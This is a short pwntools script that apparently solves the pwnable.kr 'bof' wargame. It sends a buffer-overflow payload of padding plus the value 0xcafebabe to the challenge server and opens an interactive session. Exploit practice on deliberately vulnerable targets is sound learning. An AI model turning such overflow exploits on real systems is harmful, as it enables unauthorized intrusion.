#!/usr/bin/env python3

from pwn import *

exe = ELF("./bof_patched")

context.binary = exe

payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + (0xcafebabe).to_bytes(8,"little")

def attack(conn) :
    payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + (0xcafebabe).to_bytes(8,"little")
    conn.send(payload)
    print(payload)
    


def main():
    conn = remote("pwnable.kr", 9000)
    attack(conn)    
    conn.interactive()
    pass


if __name__ == "__main__":
    main()
